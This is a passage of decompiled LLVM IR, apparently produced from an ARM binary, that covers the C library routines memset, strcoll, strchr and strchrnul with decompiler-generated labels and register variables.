  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_157e8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_157a8, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_15c14 = icmp eq i32 %arg3, 8
  store i1 %v8_15c14, i1* %cpsr_z.global-to-local, align 1
  %v5_15c18 = icmp slt i32 %arg3, 8
  br i1 %v5_15c18, label %dec_label_pc_15c78, label %dec_label_pc_15c1c

dec_label_pc_15c1c:                               ; preds = %entry
  %v4_15c1c = mul i32 %arg2, 256
  %v5_15c1c = or i32 %v4_15c1c, %arg2
  %v4_15c20 = mul i32 %v5_15c1c, 65536
  %v5_15c20 = or i32 %v4_15c20, %v5_15c1c
  store i32 %v5_15c20, i32* @r1, align 4
  %v1_15c2457 = urem i32 %tmp, 4
  %v2_15c2458 = icmp eq i32 %v1_15c2457, 0
  store i1 %v2_15c2458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_15c2458, label %dec_label_pc_15c34, label %bb

bb:                                               ; preds = %dec_label_pc_15c1c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_15c1c ]
  %v3_15c2859 = phi i32 [ %v6_15c28, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_15c1c ]
  %v4_15c28 = inttoptr i32 %v3_15c2859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15c28, align 1
  %v5_15c28 = load i32, i32* @r3, align 4
  %v6_15c28 = add i32 %v5_15c28, 1
  store i32 %v6_15c28, i32* @r3, align 4
  %v0_15c2c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15c38.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_15c2c.pr, label %dec_label_pc_15c34, label %.thread

.thread:                                          ; preds = %bb
  %v2_15c2c = add i32 %v0_15c38.pr.pre, -1
  store i32 %v2_15c2c, i32* %r2.global-to-local, align 4
  %v1_15c24 = urem i32 %v6_15c28, 4
  %v2_15c24 = icmp eq i32 %v1_15c24, 0
  store i1 %v2_15c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c24, label %dec_label_pc_15c34, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15c28.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_15c28.pre to i8
  br label %bb

dec_label_pc_15c34:                               ; preds = %.thread, %bb, %dec_label_pc_15c1c
  %v0_15c4028 = phi i32 [ %tmp, %dec_label_pc_15c1c ], [ %v6_15c28, %bb ], [ %v6_15c28, %.thread ]
  %v0_15c38.pr = phi i32 [ %arg3, %dec_label_pc_15c1c ], [ %v0_15c38.pr.pre, %bb ], [ %v2_15c2c, %.thread ]
  %v0_15c34 = load i32, i32* @r1, align 4
  store i32 %v0_15c34, i32* %ip.global-to-local, align 4
  %v8_15c3810 = icmp eq i32 %v0_15c38.pr, 8
  store i1 %v8_15c3810, i1* %cpsr_z.global-to-local, align 1
  %v5_15c3c11 = icmp slt i32 %v0_15c38.pr, 8
  br i1 %v5_15c3c11, label %dec_label_pc_15c78, label %dec_label_pc_15c40.preheader

dec_label_pc_15c40.preheader:                     ; preds = %dec_label_pc_15c34
  %v1_15c4046 = inttoptr i32 %v0_15c4028 to i32*
  store i32 %v0_15c34, i32* %v1_15c4046, align 4
  %v3_15c4047 = add i32 %v0_15c4028, 4
  %v4_15c4048 = inttoptr i32 %v3_15c4047 to i32*
  %v5_15c4049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15c4049, i32* %v4_15c4048, align 4
  %v6_15c4050 = add i32 %v0_15c4028, 8
  store i32 %v6_15c4050, i32* @r3, align 4
  %v0_15c4451 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c4452 = add i32 %v0_15c4451, -8
  store i32 %v1_15c4452, i32* %r2.global-to-local, align 4
  %v5_15c4c53 = icmp slt i32 %v1_15c4452, 8
  br i1 %v5_15c4c53, label %dec_label_pc_15c40.dec_label_pc_15c78.loopexit_crit_edge, label %dec_label_pc_15c50

dec_label_pc_15c50:                               ; preds = %dec_label_pc_15c40.preheader, %dec_label_pc_15c38.dec_label_pc_15c40_crit_edge
  %v6_15c4055 = phi i32 [ %v6_15c40, %dec_label_pc_15c38.dec_label_pc_15c40_crit_edge ], [ %v6_15c4050, %dec_label_pc_15c40.preheader ]
  %v0_15c4054 = phi i32 [ %v12_15c6c, %dec_label_pc_15c38.dec_label_pc_15c40_crit_edge ], [ %v0_15c4028, %dec_label_pc_15c40.preheader ]
  %v1_15c50 = inttoptr i32 %v6_15c4055 to i32*
  %v2_15c50 = load i32, i32* @r1, align 4
  store i32 %v2_15c50, i32* %v1_15c50, align 4
  %v3_15c50 = add i32 %v0_15c4054, 12
  %v4_15c50 = inttoptr i32 %v3_15c50 to i32*
  %v5_15c50 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15c50, i32* %v4_15c50, align 4
  %v6_15c50 = add i32 %v0_15c4054, 16
  store i32 %v6_15c50, i32* @r3, align 4
  %v0_15c54 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c54 = add i32 %v0_15c54, -8
  store i32 %v1_15c54, i32* %r2.global-to-local, align 4
  %v5_15c5c = icmp slt i32 %v1_15c54, 8
  br i1 %v5_15c5c, label %dec_label_pc_15c50.dec_label_pc_15c78.loopexit_crit_edge, label %dec_label_pc_15c60

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15c50
  %v1_15c60 = inttoptr i32 %v6_15c50 to i32*
  %v2_15c60 = load i32, i32* @r1, align 4
  store i32 %v2_15c60, i32* %v1_15c60, align 4
  %v3_15c60 = add i32 %v0_15c4054, 20
  %v4_15c60 = inttoptr i32 %v3_15c60 to i32*
  %v5_15c60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15c60, i32* %v4_15c60, align 4
  %v6_15c60 = add i32 %v0_15c4054, 24
  store i32 %v6_15c60, i32* @r3, align 4
  %v0_15c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c64 = add i32 %v0_15c64, -8
  store i32 %v1_15c64, i32* %r2.global-to-local, align 4
  %v5_15c6c = icmp slt i32 %v1_15c64, 8
  br i1 %v5_15c6c, label %dec_label_pc_15c60.dec_label_pc_15c78.loopexit_crit_edge, label %dec_label_pc_15c38

dec_label_pc_15c38:                               ; preds = %dec_label_pc_15c60
  %v7_15c6c = inttoptr i32 %v6_15c60 to i32*
  %v8_15c6c = load i32, i32* @r1, align 4
  store i32 %v8_15c6c, i32* %v7_15c6c, align 4
  %v9_15c6c = add i32 %v0_15c4054, 28
  %v10_15c6c = inttoptr i32 %v9_15c6c to i32*
  %v11_15c6c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15c6c, i32* %v10_15c6c, align 4
  %v12_15c6c = add i32 %v0_15c4054, 32
  store i32 %v12_15c6c, i32* @r3, align 4
  %v6_15c70 = load i32, i32* %r2.global-to-local, align 4
  %v7_15c70 = add i32 %v6_15c70, -8
  store i32 %v7_15c70, i32* %r2.global-to-local, align 4
  %v5_15c3c = icmp slt i32 %v7_15c70, 8
  br i1 %v5_15c3c, label %dec_label_pc_15c38.dec_label_pc_15c78.loopexit_crit_edge, label %dec_label_pc_15c38.dec_label_pc_15c40_crit_edge

dec_label_pc_15c38.dec_label_pc_15c40_crit_edge:  ; preds = %dec_label_pc_15c38
  %v2_15c40.pre = load i32, i32* @r1, align 4
  %v1_15c40 = inttoptr i32 %v12_15c6c to i32*
  store i32 %v2_15c40.pre, i32* %v1_15c40, align 4
  %v3_15c40 = add i32 %v0_15c4054, 36
  %v4_15c40 = inttoptr i32 %v3_15c40 to i32*
  %v5_15c40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15c40, i32* %v4_15c40, align 4
  %v6_15c40 = add i32 %v0_15c4054, 40
  store i32 %v6_15c40, i32* @r3, align 4
  %v0_15c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c44 = add i32 %v0_15c44, -8
  store i32 %v1_15c44, i32* %r2.global-to-local, align 4
  %v5_15c4c = icmp slt i32 %v1_15c44, 8
  br i1 %v5_15c4c, label %dec_label_pc_15c40.dec_label_pc_15c78.loopexit_crit_edge, label %dec_label_pc_15c50

dec_label_pc_15c38.dec_label_pc_15c78.loopexit_crit_edge: ; preds = %dec_label_pc_15c38
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c78

dec_label_pc_15c40.dec_label_pc_15c78.loopexit_crit_edge: ; preds = %dec_label_pc_15c38.dec_label_pc_15c40_crit_edge, %dec_label_pc_15c40.preheader
  %v1_15c44.lcssa = phi i32 [ %v1_15c4452, %dec_label_pc_15c40.preheader ], [ %v1_15c44, %dec_label_pc_15c38.dec_label_pc_15c40_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c78

dec_label_pc_15c50.dec_label_pc_15c78.loopexit_crit_edge: ; preds = %dec_label_pc_15c50
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c78

dec_label_pc_15c60.dec_label_pc_15c78.loopexit_crit_edge: ; preds = %dec_label_pc_15c60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c78

dec_label_pc_15c78:                               ; preds = %dec_label_pc_15c34, %dec_label_pc_15c38.dec_label_pc_15c78.loopexit_crit_edge, %dec_label_pc_15c40.dec_label_pc_15c78.loopexit_crit_edge, %dec_label_pc_15c50.dec_label_pc_15c78.loopexit_crit_edge, %dec_label_pc_15c60.dec_label_pc_15c78.loopexit_crit_edge, %entry
  %v0_15c80 = phi i32 [ %arg3, %entry ], [ %v1_15c64, %dec_label_pc_15c60.dec_label_pc_15c78.loopexit_crit_edge ], [ %v1_15c54, %dec_label_pc_15c50.dec_label_pc_15c78.loopexit_crit_edge ], [ %v1_15c44.lcssa, %dec_label_pc_15c40.dec_label_pc_15c78.loopexit_crit_edge ], [ %v7_15c70, %dec_label_pc_15c38.dec_label_pc_15c78.loopexit_crit_edge ], [ %v0_15c38.pr, %dec_label_pc_15c34 ]
  %v2_15c78 = icmp eq i32 %v0_15c80, 0
  store i1 %v2_15c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c78, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15c78
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_15c78
  %v1_15c80 = sub i32 7, %v0_15c80
  store i32 %v1_15c80, i32* %r2.global-to-local, align 4
  %v3_15c84 = mul i32 %v1_15c80, 4
  %v4_15c84 = add i32 %v3_15c84, ptrtoint (i32* @global_var_15c8c.876 to i32)
  call void @__pseudo_branch(i32 %v4_15c84)
  %v0_15c8c = load i32, i32* @r1, align 4
  %v1_15c8c = trunc i32 %v0_15c8c to i8
  %v2_15c8c = load i32, i32* @r3, align 4
  %v3_15c8c = inttoptr i32 %v2_15c8c to i8*
  store i8 %v1_15c8c, i8* %v3_15c8c, align 1
  %v4_15c8c = load i32, i32* @r3, align 4
  %v5_15c8c = add i32 %v4_15c8c, 1
  store i32 %v5_15c8c, i32* %r3.global-to-local, align 4
  %v0_15c90 = load i32, i32* @r1, align 4
  %v1_15c90 = trunc i32 %v0_15c90 to i8
  %v3_15c90 = inttoptr i32 %v5_15c8c to i8*
  store i8 %v1_15c90, i8* %v3_15c90, align 1
  %v4_15c90 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c90 = add i32 %v4_15c90, 1
  store i32 %v5_15c90, i32* %r3.global-to-local, align 4
  %v0_15c94 = load i32, i32* @r1, align 4
  %v1_15c94 = trunc i32 %v0_15c94 to i8
  %v3_15c94 = inttoptr i32 %v5_15c90 to i8*
  store i8 %v1_15c94, i8* %v3_15c94, align 1
  %v4_15c94 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c94 = add i32 %v4_15c94, 1
  store i32 %v5_15c94, i32* %r3.global-to-local, align 4
  %v0_15c98 = load i32, i32* @r1, align 4
  %v1_15c98 = trunc i32 %v0_15c98 to i8
  %v3_15c98 = inttoptr i32 %v5_15c94 to i8*
  store i8 %v1_15c98, i8* %v3_15c98, align 1
  %v4_15c98 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c98 = add i32 %v4_15c98, 1
  store i32 %v5_15c98, i32* %r3.global-to-local, align 4
  %v0_15c9c = load i32, i32* @r1, align 4
  %v1_15c9c = trunc i32 %v0_15c9c to i8
  %v3_15c9c = inttoptr i32 %v5_15c98 to i8*
  store i8 %v1_15c9c, i8* %v3_15c9c, align 1
  %v4_15c9c = load i32, i32* %r3.global-to-local, align 4
  %v5_15c9c = add i32 %v4_15c9c, 1
  store i32 %v5_15c9c, i32* %r3.global-to-local, align 4
  %v0_15ca0 = load i32, i32* @r1, align 4
  %v1_15ca0 = trunc i32 %v0_15ca0 to i8
  %v3_15ca0 = inttoptr i32 %v5_15c9c to i8*
  store i8 %v1_15ca0, i8* %v3_15ca0, align 1
  %v4_15ca0 = load i32, i32* %r3.global-to-local, align 4
  %v5_15ca0 = add i32 %v4_15ca0, 1
  store i32 %v5_15ca0, i32* %r3.global-to-local, align 4
  %v0_15ca4 = load i32, i32* @r1, align 4
  %v1_15ca4 = trunc i32 %v0_15ca4 to i8
  %v3_15ca4 = inttoptr i32 %v5_15ca0 to i8*
  store i8 %v1_15ca4, i8* %v3_15ca4, align 1
  %v4_15ca4 = load i32, i32* %r3.global-to-local, align 4
  %v5_15ca4 = add i32 %v4_15ca4, 1
  store i32 %v5_15ca4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15c40, { 1, 0 }
  uselistorder i32 %v12_15c6c, { 1, 2, 0 }
  uselistorder i32 %v0_15c4054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15c38.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15c28, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_15c1c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 2, 1, 0, 3, 9, 7, 6, 4, 8 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15c78, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15c50, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15cb4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_15cb4 = phi i32 [ %v0_15cb4.pre, %bb ], [ %v5_15cb4, %bb3 ]
  %v0_15cb0 = phi i32 [ %tmp, %bb ], [ %v5_15cb0, %bb3 ]
  %v1_15cb0 = inttoptr i32 %v0_15cb0 to i8*
  %v2_15cb0 = load i8, i8* %v1_15cb0, align 1
  %v1_15cb4 = inttoptr i32 %v0_15cb4 to i8*
  %v2_15cb4 = load i8, i8* %v1_15cb4, align 1
  %v3_15cb4 = zext i8 %v2_15cb4 to i32
  %v2_15cb8 = icmp eq i8 %v2_15cb0, 0
  br i1 %v2_15cb8, label %.dec_label_pc_15cc4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_15cb4 = add i32 %v0_15cb4, 1
  %v5_15cb0 = add i32 %v0_15cb0, 1
  %v3_15cb0 = zext i8 %v2_15cb0 to i32
  %v10_15cbc = icmp eq i8 %v2_15cb0, %v2_15cb4
  br i1 %v10_15cbc, label %entry, label %dec_label_pc_15cc4

.dec_label_pc_15cc4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %bb3, %.dec_label_pc_15cc4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15cc4_crit_edge ], [ %v3_15cb0, %bb3 ]
  %v2_15cc4.pre-phi = sub nsw i32 %.pn, %v3_15cb4
  ret i32 %v2_15cc4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_15cb0, { 0, 2, 1 }
  uselistorder i32 %v0_15cb0, { 1, 0 }
  uselistorder i32 %v0_15cb4, { 1, 0 }
  uselistorder label %dec_label_pc_15cc4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_15d34 = urem i32 %arg1, 256
  %v0_15d543 = load i32, i32* @r0, align 4
  %v1_15d544 = urem i32 %v0_15d543, 4
  %v2_15d545 = icmp eq i32 %v1_15d544, 0
  br i1 %v2_15d545, label %dec_label_pc_15d5c, label %dec_label_pc_15d3c

dec_label_pc_15d3c:                               ; preds = %entry, %dec_label_pc_15d50
  %v0_15d50 = phi i32 [ %v1_15d50, %dec_label_pc_15d50 ], [ %v0_15d543, %entry ]
  %v1_15d3c = inttoptr i32 %v0_15d50 to i8*
  %v2_15d3c = load i8, i8* %v1_15d3c, align 1
  %v3_15d3c = zext i8 %v2_15d3c to i32
  %v9_15d40 = icmp eq i32 %v3_15d3c, %v1_15d34
  br i1 %v9_15d40, label %dec_label_pc_15e10, label %dec_label_pc_15d48

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15d3c
  %v2_15d48 = icmp eq i8 %v2_15d3c, 0
  br i1 %v2_15d48, label %dec_label_pc_15e0c, label %dec_label_pc_15d50

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15d48
  %v1_15d50 = add i32 %v0_15d50, 1
  %v1_15d54 = urem i32 %v1_15d50, 4
  %v2_15d54 = icmp eq i32 %v1_15d54, 0
  br i1 %v2_15d54, label %dec_label_pc_15d5c, label %dec_label_pc_15d3c

dec_label_pc_15d5c:                               ; preds = %dec_label_pc_15d50, %entry
  %v0_15d60 = phi i32 [ %v0_15d543, %entry ], [ %v1_15d50, %dec_label_pc_15d50 ]
  %v4_15d5c = mul nuw nsw i32 %v1_15d34, 256
  %v5_15d5c = or i32 %v4_15d5c, %v1_15d34
  %v4_15d64 = mul i32 %v5_15d5c, 65536
  %v5_15d64 = or i32 %v4_15d64, %v5_15d5c
  br label %dec_label_pc_15d68

dec_label_pc_15d68:                               ; preds = %dec_label_pc_15e04, %dec_label_pc_15da4, %dec_label_pc_15d5c
  %v0_15dcc = phi i32 [ %v0_15d60, %dec_label_pc_15d5c ], [ %v4_15d68, %dec_label_pc_15da4 ], [ %v4_15d68, %dec_label_pc_15e04 ]
  %v1_15d68 = inttoptr i32 %v0_15dcc to i32*
  %v2_15d68 = load i32, i32* %v1_15d68, align 4
  %v4_15d68 = add i32 %v0_15dcc, 4
  %v2_15d70 = xor i32 %v2_15d68, %v5_15d64
  %v2_15d7c = add i32 %v2_15d68, 2130640639
  %v1_15d80 = sub i32 -1, %v2_15d68
  %v2_15d84 = xor i32 %v2_15d7c, %v1_15d80
  %v2_15d90 = and i32 %v2_15d84, -2130640640
  store i32 %v2_15d90, i32* @r1, align 4
  %v2_15d98 = icmp eq i32 %v2_15d90, 0
  br i1 %v2_15d98, label %dec_label_pc_15da4, label %dec_label_pc_15dac

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d68
  %v2_15d74 = add i32 %v2_15d70, 2130640639
  %v1_15d8c = sub i32 -1, %v2_15d70
  %v2_15d94 = xor i32 %v2_15d74, %v1_15d8c
  %v2_15d9c = and i32 %v2_15d94, -2130640640
  %v2_15da4 = icmp eq i32 %v2_15d9c, 0
  br i1 %v2_15da4, label %dec_label_pc_15d68, label %dec_label_pc_15dac

dec_label_pc_15dac:                               ; preds = %dec_label_pc_15d68, %dec_label_pc_15da4
  %v2_15dac = inttoptr i32 %v0_15dcc to i8*
  %v3_15dac = load i8, i8* %v2_15dac, align 1
  %v4_15dac = zext i8 %v3_15dac to i32
  %v9_15db0 = icmp eq i32 %v4_15dac, %v1_15d34
  br i1 %v9_15db0, label %dec_label_pc_15e10, label %dec_label_pc_15dbc

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15dac
  %v2_15dbc = icmp eq i8 %v3_15dac, 0
  br i1 %v2_15dbc, label %dec_label_pc_15e0c, label %dec_label_pc_15dc4

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15dbc
  %v1_15dc4 = add i32 %v0_15dcc, 1
  %v2_15dc4 = inttoptr i32 %v1_15dc4 to i8*
  %v3_15dc4 = load i8, i8* %v2_15dc4, align 1
  %v4_15dc4 = zext i8 %v3_15dc4 to i32
  %v9_15dc8 = icmp eq i32 %v4_15dc4, %v1_15d34
  br i1 %v9_15dc8, label %dec_label_pc_15e10, label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15dc4
  %v2_15dd4 = icmp eq i8 %v3_15dc4, 0
  br i1 %v2_15dd4, label %dec_label_pc_15e0c, label %dec_label_pc_15ddc

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15dd4
  %v1_15ddc = add i32 %v0_15dcc, 2
  %v2_15ddc = inttoptr i32 %v1_15ddc to i8*
  %v3_15ddc = load i8, i8* %v2_15ddc, align 1
  %v4_15ddc = zext i8 %v3_15ddc to i32
  %v9_15de0 = icmp eq i32 %v4_15ddc, %v1_15d34
  br i1 %v9_15de0, label %dec_label_pc_15e10, label %dec_label_pc_15dec

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15ddc
  %v2_15dec = icmp eq i8 %v3_15ddc, 0
  br i1 %v2_15dec, label %dec_label_pc_15e0c, label %dec_label_pc_15df4

dec_label_pc_15df4:                               ; preds = %dec_label_pc_15dec
  %v1_15df4 = add i32 %v0_15dcc, 3
  %v2_15df4 = inttoptr i32 %v1_15df4 to i8*
  %v3_15df4 = load i8, i8* %v2_15df4, align 1
  %v4_15df4 = zext i8 %v3_15df4 to i32
  %v9_15df8 = icmp eq i32 %v4_15df4, %v1_15d34
  br i1 %v9_15df8, label %dec_label_pc_15e10, label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15df4
  %v2_15e04 = icmp eq i8 %v3_15df4, 0
  br i1 %v2_15e04, label %dec_label_pc_15e0c, label %dec_label_pc_15d68

dec_label_pc_15e0c:                               ; preds = %dec_label_pc_15d48, %dec_label_pc_15e04, %dec_label_pc_15dec, %dec_label_pc_15dd4, %dec_label_pc_15dbc
  br label %dec_label_pc_15e10

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15d3c, %dec_label_pc_15df4, %dec_label_pc_15ddc, %dec_label_pc_15dc4, %dec_label_pc_15dac, %dec_label_pc_15e0c
  %v1_15e14 = phi i32 [ 0, %dec_label_pc_15e0c ], [ %v1_15df4, %dec_label_pc_15df4 ], [ %v1_15ddc, %dec_label_pc_15ddc ], [ %v1_15dc4, %dec_label_pc_15dc4 ], [ %v0_15dcc, %dec_label_pc_15dac ], [ %v0_15d50, %dec_label_pc_15d3c ]
  ret i32 %v1_15e14

; uselistorder directives
  uselistorder i32 %v4_15d68, { 1, 0 }
  uselistorder i32 %v2_15d68, { 0, 2, 1 }
  uselistorder i32 %v0_15dcc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15d5c, { 1, 0 }
  uselistorder i32 %v1_15d50, { 1, 0, 2 }
  uselistorder i32 %v0_15d543, { 2, 1, 0 }
  uselistorder i32 %v1_15d34, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15e10, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15e0c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15dac, { 1, 0 }
  uselistorder label %dec_label_pc_15d3c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_15e24 = urem i32 %arg1, 256
  %v0_15e442 = load i32, i32* @r0, align 4
  %v1_15e443 = urem i32 %v0_15e442, 4
  %v2_15e444 = icmp eq i32 %v1_15e443, 0
  br i1 %v2_15e444, label %dec_label_pc_15e4c, label %dec_label_pc_15e2c

dec_label_pc_15e2c:                               ; preds = %entry, %dec_label_pc_15e40
  %v0_15e40 = phi i32 [ %v1_15e40, %dec_label_pc_15e40 ], [ %v0_15e442, %entry ]
  %v1_15e2c = inttoptr i32 %v0_15e40 to i8*
  %v2_15e2c = load i8, i8* %v1_15e2c, align 1
  %v3_15e2c = zext i8 %v2_15e2c to i32
  %v9_15e30 = icmp eq i32 %v3_15e2c, %v1_15e24
  br i1 %v9_15e30, label %dec_label_pc_15efc, label %dec_label_pc_15e38

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15e2c
  %v2_15e38 = icmp eq i8 %v2_15e2c, 0
  br i1 %v2_15e38, label %dec_label_pc_15efc, label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %dec_label_pc_15e38
  %v1_15e40 = add i32 %v0_15e40, 1
  %v1_15e44 = urem i32 %v1_15e40, 4
  %v2_15e44 = icmp eq i32 %v1_15e44, 0
  br i1 %v2_15e44, label %dec_label_pc_15e4c, label %dec_label_pc_15e2c

dec_label_pc_15e4c:                               ; preds = %dec_label_pc_15e40, %entry
  %v0_15e50 = phi i32 [ %v0_15e442, %entry ], [ %v1_15e40, %dec_label_pc_15e40 ]
  %v4_15e4c = mul nuw nsw i32 %v1_15e24, 256
  %v5_15e4c = or i32 %v4_15e4c, %v1_15e24
  %v4_15e54 = mul i32 %v5_15e4c, 65536
  %v5_15e54 = or i32 %v4_15e54, %v5_15e4c
  br label %dec_label_pc_15e58

dec_label_pc_15e58:                               ; preds = %dec_label_pc_15ef4, %dec_label_pc_15e94, %dec_label_pc_15e4c
  %v0_15ebc = phi i32 [ %v0_15e50, %dec_label_pc_15e4c ], [ %v4_15e58, %dec_label_pc_15e94 ], [ %v4_15e58, %dec_label_pc_15ef4 ]
  %v1_15e58 = inttoptr i32 %v0_15ebc to i32*
  %v2_15e58 = load i32, i32* %v1_15e58, align 4
  %v4_15e58 = add i32 %v0_15ebc, 4
  %v2_15e60 = xor i32 %v2_15e58, %v5_15e54
  %v2_15e6c = add i32 %v2_15e58, 2130640639
  %v1_15e70 = sub i32 -1, %v2_15e58
  %v2_15e74 = xor i32 %v2_15e6c, %v1_15e70
  %v2_15e80 = and i32 %v2_15e74, -2130640640
  store i32 %v2_15e80, i32* @r1, align 4
  %v2_15e88 = icmp eq i32 %v2_15e80, 0
  br i1 %v2_15e88, label %dec_label_pc_15e94, label %dec_label_pc_15e9c

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e58
  %v2_15e64 = add i32 %v2_15e60, 2130640639
  %v1_15e7c = sub i32 -1, %v2_15e60
  %v2_15e84 = xor i32 %v2_15e64, %v1_15e7c
  %v2_15e8c = and i32 %v2_15e84, -2130640640
  %v2_15e94 = icmp eq i32 %v2_15e8c, 0
  br i1 %v2_15e94, label %dec_label_pc_15e58, label %dec_label_pc_15e9c

dec_label_pc_15e9c:                               ; preds = %dec_label_pc_15e58, %dec_label_pc_15e94
  %v2_15e9c = inttoptr i32 %v0_15ebc to i8*
  %v3_15e9c = load i8, i8* %v2_15e9c, align 1
  %v4_15e9c = zext i8 %v3_15e9c to i32
  %v9_15ea0 = icmp eq i32 %v4_15e9c, %v1_15e24
  br i1 %v9_15ea0, label %dec_label_pc_15efc, label %dec_label_pc_15eac

dec_label_pc_15eac:                               ; preds = %dec_label_pc_15e9c
  %v2_15eac = icmp eq i8 %v3_15e9c, 0
  br i1 %v2_15eac, label %dec_label_pc_15efc, label %dec_label_pc_15eb4

dec_label_pc_15eb4:                               ; preds = %dec_label_pc_15eac
  %v1_15eb4 = add i32 %v0_15ebc, 1
  %v2_15eb4 = inttoptr i32 %v1_15eb4 to i8*
  %v3_15eb4 = load i8, i8* %v2_15eb4, align 1
  %v4_15eb4 = zext i8 %v3_15eb4 to i32
  %v9_15eb8 = icmp eq i32 %v4_15eb4, %v1_15e24
  br i1 %v9_15eb8, label %dec_label_pc_15efc, label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %dec_label_pc_15eb4
  %v2_15ec4 = icmp eq i8 %v3_15eb4, 0
  br i1 %v2_15ec4, label %dec_label_pc_15efc, label %dec_label_pc_15ecc

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15ec4
  %v1_15ecc = add i32 %v0_15ebc, 2
  %v2_15ecc = inttoptr i32 %v1_15ecc to i8*
  %v3_15ecc = load i8, i8* %v2_15ecc, align 1
  %v4_15ecc = zext i8 %v3_15ecc to i32
  %v9_15ed0 = icmp eq i32 %v4_15ecc, %v1_15e24
